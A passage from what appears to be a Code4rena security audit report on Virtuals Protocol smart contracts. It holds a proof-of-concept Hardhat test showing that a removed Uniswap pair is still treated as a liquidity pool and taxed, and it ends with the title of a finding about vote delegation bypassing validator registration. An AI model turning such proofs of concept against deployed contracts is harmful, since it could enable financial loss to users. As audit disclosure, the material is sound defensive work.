<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-13"><a class="anchor before" aria-label="proof of concept 13 permalink" href="#proof-of-concept-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>The test case below was ran using a base mainnet fork, please add the same to the <code>hardhat.config.js</code> file. The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:</p>
<pre data-index="78" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    "hardhat": "^2.23.0",</span></span></code></pre>
<p>Add the following values to the <code>.env</code> file (along with private keys):</p>
<pre data-index="79" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">### Genesis DAO settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_VOTING_DELAY=0</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_VOTING_PERIOD=900</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_PROPOSAL_THRESHOLD=0</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Virtual DAO settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_VOTING_DELAY=0</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_VOTING_PERIOD=900</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_QUORUM_NUMERATOR=1000</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Other settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">CHAIN_ID=84532</span></span>
<span class="grvsc-line"><span class="grvsc-source">VIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50</span></span>
<span class="grvsc-line"><span class="grvsc-source">VIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V</span></span>
<span class="grvsc-line"><span class="grvsc-source">MATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### AgentToken settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_SUPPLY=1000000000 # 1B supply</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT=1000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_VAULT_SUPPLY=0 #</span></span>
<span class="grvsc-line"><span class="grvsc-source">BOT_PROTECTION=3600 # 1hr</span></span>
<span class="grvsc-line"><span class="grvsc-source">TAX=100 # 3%</span></span>
<span class="grvsc-line"><span class="grvsc-source">BONDING_TAX=1</span></span>
<span class="grvsc-line"><span class="grvsc-source">SWAP_THRESHOLD=1 # 0.00001% of total supply</span></span>
<span class="grvsc-line"><span class="grvsc-source">### VOTING_TOKEN=</span></span>
<span class="grvsc-line"><span class="grvsc-source">TBA_REGISTRY=</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Reward settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">PARENT_SHARES=2000 # 20%</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_SHARES=1000 # 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">CONTRIBUTOR_SHARES=5000 # 50%</span></span>
<span class="grvsc-line"><span class="grvsc-source">STAKER_SHARES=9000 # 90%</span></span>
<span class="grvsc-line"><span class="grvsc-source">REWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth</span></span>
<span class="grvsc-line"><span class="grvsc-source">DATASET_SHARES=7000 # 70%</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### TAX MANAGER</span></span>
<span class="grvsc-line"><span class="grvsc-source">MIN_SWAP_THRESHOLD=100000000000000000 # 0.1</span></span>
<span class="grvsc-line"><span class="grvsc-source">MAX_SWAP_THRESHOLD=1000000000000000000000 # 1000</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">UNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24</span></span></code></pre>
<p>Create a file called <code>PoC.js</code> and add the following test case inside the <code>/tests</code> folder and run <code>npx hardhat test --grep "Removed liquidity pair still accrues taxes"</code>:</p>
<details>
<pre data-index="80" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">const { parseEther, toBeHex, formatEther } = require("ethers/utils");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { expect } = require("chai");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const {</span></span>
<span class="grvsc-line"><span class="grvsc-source">  loadFixture,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  mine,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  impersonateAccount,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  setBalance,</span></span>
<span class="grvsc-line"><span class="grvsc-source">} = require("@nomicfoundation/hardhat-toolbox/network-helpers");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { ethers } = require("hardhat");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">describe("AgentFactory", () =&gt; {</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const PROPOSAL_THRESHOLD = parseEther("50000"); // 50k</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const MATURITY_SCORE = toBeHex(2000, 32); // 20%</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const IP_SHARE = 1000; // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  const genesisInput = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    name: "Jessica",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    symbol: "JSC",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tokenURI: "http://jessica",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoName: "Jessica DAO",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    cores: [0, 1, 2],</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tbaSalt:</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoVotingPeriod: 600,</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoThreshold: 1000000000000000000000n,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  };</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  const getAccounts = async () =&gt; {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Fund all accounts with ETH for gas (10 ETH each)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    for (const account of fundAccounts) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await setBalance(account.address, parseEther("10"));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  };</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployBaseContracts() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { deployer, ipVault, treasury } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Setting up environment variables if not present in the actual .env</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // This is for testing purposes only</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = "1000"; // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = "0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9"; // Base mainnet Uniswap router</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther("10000000").toString(); // 10M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther("5000000").toString(); // 5M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther("2000000").toString(); // 2M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = "100"; // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.TAX) process.env.TAX = "500"; // 5%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther("10").toString(); // 10 tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying VirtualToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const virtualToken = await ethers.deployContract(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "VirtualToken",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [PROPOSAL_THRESHOLD, deployer.address],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`VirtualToken deployed at ${virtualToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ERC6551Registry Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tbaRegistry = await ethers.deployContract("ERC6551Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await tbaRegistry.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deployed ERC6551Registry Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentNftV2...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const AgentNft = await ethers.getContractFactory("AgentNftV2");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentNftV2 deployed at ${agentNft.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ContributionNft...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const contribution = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("ContributionNft"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [agentNft.target],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`ContributionNft deployed at ${contribution.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ServiceNft...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const service = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("ServiceNft"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [agentNft.target, contribution.target, process.env.DATASET_SHARES],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`ServiceNft deployed at ${service.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentNft.setContributionService(contribution.target, service.target);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Set contribution and service on AgentNft");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Implementation contracts</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentToken = await ethers.deployContract("AgentToken");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentToken deployed at ${agentToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentDAO...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentDAO = await ethers.deployContract("AgentDAO");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentDAO.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentDAO deployed at ${agentDAO.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentVeToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentVeToken = await ethers.deployContract("AgentVeToken");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentVeToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentFactoryV2...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentFactory = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("AgentFactoryV2"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentVeToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentDAO.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tbaRegistry.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        virtualToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentNft.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        PROPOSAL_THRESHOLD,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        deployer.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Granted MINTER_ROLE to AgentFactory");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying Minter...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const minter = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("Minter"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [</span></span>
<span class="grvsc-line"><span class="grvsc-source">        service.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        contribution.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentNft.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        1e12,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        20,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ipVault.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentFactory.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        deployer.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        1e10,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await minter.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Minter deployed at ${minter.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Setting parameters on AgentFactory...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenAdmin(deployer.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenSupplyParams(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LP_SUPPLY,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_VAULT_SUPPLY,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.BOT_PROTECTION,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      minter.target</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenTaxParams(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.TAX,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.TAX,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.SWAP_THRESHOLD,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      treasury.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("AgentFactory parameters set");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployWithApplication() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await deployBaseContracts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agentFactory, virtualToken, tbaRegistry } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Prepare tokens for proposal</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Minting VirtualToken for founder...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(agentFactory.target, PROPOSAL_THRESHOLD);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">console.log("Proposing agent...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tx = await agentFactory</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .proposeAgent(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.name,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.symbol,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.tokenURI,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.cores,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.tbaSalt,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tbaRegistry.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.daoVotingPeriod,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.daoThreshold</span></span>
<span class="grvsc-line"><span class="grvsc-source">      );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">      await tx.wait();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const filter = agentFactory.filters.NewApplication;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const events = await agentFactory.queryFilter(filter, -1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const event = events[0];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { id } = event.args;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Agent application created with ID: ${id}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { applicationId: id, ...base };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployWithAgent() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await deployWithApplication();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agentFactory, applicationId } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Executing application...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .executeApplication(applicationId, false);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryFilter = agentFactory.filters.NewPersona;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryEvent = factoryEvents[0];</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Agent created with virtualId: ${virtualId}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    return {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ...base,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      agent: {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        virtualId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        token,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        veToken,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        dao,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tba,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        lp,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      },</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  before(async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Increase timeout for all tests</span></span>
<span class="grvsc-line"><span class="grvsc-source">    this.timeout(60000);</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">it("Removed liquidity pair still accrues taxes", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agent, agentNft, virtualToken} = await loadFixture(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      deployWithAgent</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { trader, poorMan, founder, randomAddr, deployer } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const router = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "IUniswapV2Router02",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.UNISWAP_ROUTER</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentToken = await ethers.getContractAt("AgentToken", agent.token);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const uniswapV2Pair = await agentToken.uniswapV2Pair();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("uniswapV2Pair: ", uniswapV2Pair);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentToken.connect(deployer).removeLiquidityPool(uniswapV2Pair);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Should still assert isLiquidityPool as true</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await agentToken.isLiquidityPool(uniswapV2Pair)).to.be.eq(true);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">});</span></span></code></pre>
</details>
<hr>
<h2 style="position:relative;" id="m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards"><a class="anchor before" aria-label="m 14 votesupgradeabledelegate bypasses the addvalidator call leads to a non validator holding voting power along with loss of rewards permalink" href="#m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-52">[M-14] <code>VotesUpgradeable::delegate</code> bypasses the <code>addValidator</code> call, leads to a non-validator holding voting power along with loss of rewards</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-557">YouCrossTheLineAlfie</a></em></p>
